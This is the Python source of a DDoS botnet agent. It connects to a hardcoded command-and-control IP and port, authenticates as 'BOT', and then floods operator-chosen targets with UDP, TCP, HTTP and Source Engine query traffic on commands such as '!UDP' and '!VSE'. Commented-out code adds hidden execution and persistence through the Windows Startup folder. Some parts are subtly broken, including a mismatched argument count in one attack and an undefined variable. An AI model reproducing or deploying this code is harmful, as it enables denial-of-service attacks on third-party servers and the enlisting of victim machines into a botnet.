import socket, threading, time, random, cloudscraper, requests
import os
import shutil
import sys
import subprocess
from requests.exceptions import SSLError, Timeout


C2_ADDRESS  = "87.106.232.239"
C2_PORT     = 5555


def detect_max_packets():
    max_packets = 0
    max_packet_size = 1
    target_time = 0.1  # Target time for sending packets in seconds
    max_packet_limit = 1950  # Maximum packet size limit

    while True:
        try:
            start_time = time.time()
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b'0' * max_packet_size
            s.sendto(data, ("localhost", 0))  # Send packet to localhost
            end_time = time.time()
            elapsed_time = end_time - start_time

            if elapsed_time >= target_time or max_packet_size >= max_packet_limit:
                break  # Maximum packet size or packets per second reached

            max_packets += 1
            max_packet_size += 1  # Increase the packet size for next iteration

        except Exception as e:
            print(f"Error: {e}")
            break
        finally:
            s.close()

    return max_packets







# layer 4 
def launch_cfb(url, end_time, th=15):
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_cfb, args=(url, end_time))
            thd.start()
        except Exception as e:
            print(f"Error launching thread: {e}")

def attack_cfb(url, end_time):
    max_packets = detect_max_packets()
    scraper = cloudscraper.create_scraper()

    while time.time() < end_time:
        try:
            packets_sent = 0
            while time.time() < end_time and packets_sent < max_packets:
                scraper.get(url, timeout=15)
                scraper.get(url, timeout=15)
                packets_sent += 1
        except Exception as e:
            print("Error:", e)
            continue

def attack_udp(ip, port, end_time, size):
    print("attack started")
    max_packets = detect_max_packets()
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            packets_sent = 0
            while time.time() < end_time and packets_sent < max_packets:
                data = os.urandom(size)
                s.sendto(data, (ip, dport))
                packets_sent += 1
        except Exception as e:
            print("Error:", e)
            continue
        finally:
            s.close()

def attack_fivem(ip, port, end_time, size):
    max_packets = detect_max_packets()
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            packets_sent = 0
            while time.time() < end_time and packets_sent < max_packets:
                data = os.urandom(size)
                s.sendto(data, (ip, dport))
                packets_sent += 1
        except Exception as e:
            print("Error:", e)
            continue
        finally:
            s.close()
    
def attack_udpkill(ip, port, end_time, size):
    max_packets = detect_max_packets()
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            packets_sent = 0
            while time.time() < end_time and packets_sent < max_packets:
                data = os.urandom(size)
                s.sendto(data, (ip, dport))
                packets_sent += 1
        except Exception as e:
            print("Error:", e)
            continue
        finally:
            s.close()


def attack_tcp(ip, port, end_time, size):
    max_packets = detect_max_packets()

    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            packets_sent = 0
            while time.time() < end_time and packets_sent < max_packets:
                s.send(random._urandom(size))
                packets_sent += 1
        except:
            pass
        finally:
            s.close()


def attack_tcpkill(ip, port, end_time, size):
    max_packets = detect_max_packets()

    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            packets_sent = 0
            while time.time() < end_time and packets_sent < max_packets:
                s.send(random._urandom(size))
                packets_sent += 1
                print('Pacote TCP Enviado')
        except:
            pass
        finally:
            s.close()




def attack_vse(ip, port, end_time):
    max_packets = detect_max_packets()
    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
               b'\x20\x51\x75\x65\x72\x79\x00')  # Read more here > https://developer.valvesoftware.com/wiki/Server_queries    


    while time.time() < end_time:  
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(max_packets):
                s.sendto(payload, (ip, port))
            time.sleep(1.0 / max_packets)  # Control packet sending rate
        except Exception as e:
            print(f"Error sending packet: {e}")
        finally:
            s.close()



# games

    








def main():
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        while 1:
            try:
                c2.connect((C2_ADDRESS, C2_PORT))
                while 1:
                    c2.send('669787761736865726500'.encode())
                    break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send('BOT'.encode())
                        break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        break
                break
            except:
                time.sleep(5)
        while 1:
            try:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].upper()

                if command == '!UDP':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!TCP':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!TUP':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!UDPKILL':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_udpkill, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!TCPKILL':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcpkill, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!FIVEM':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_fivem, args=(ip, port, end_time), daemon=True).start()
                if command == '!VSE':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_vse, args=(ip, port, end_time), daemon=True).start()
                elif command == 'PING':
                    c2.send('PONG'.encode())
            except:
                break

        c2.close()

        main()

#def get_executable_path():
   # return os.path.abspath(sys.argv[0])

#def hide_cmd_and_run_exe(exe_path):
  #  startupinfo = subprocess.STARTUPINFO()
  #  startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
  #  subprocess.Popen(exe_path, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)

#def copy_self_to_startup():
   # script_or_exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
   # script_or_exe_dir = os.path.dirname(os.path.abspath(script_or_exe_path))
   # script_or_exe_name = os.path.basename(script_or_exe_path)
   # startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
   # if not script_in_startup:
       # shutil.copy(os.path.join(script_or_exe_dir, script_or_exe_name), os.path.join(startup_folder, script_or_exe_name))

def check_internet_connection():
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

if __name__ == '__main__':
    while True:
        if check_internet_connection():
            #copy_self_to_startup()
            #exe_path = get_executable_path()
            main()
        else:
            time.sleep(5)
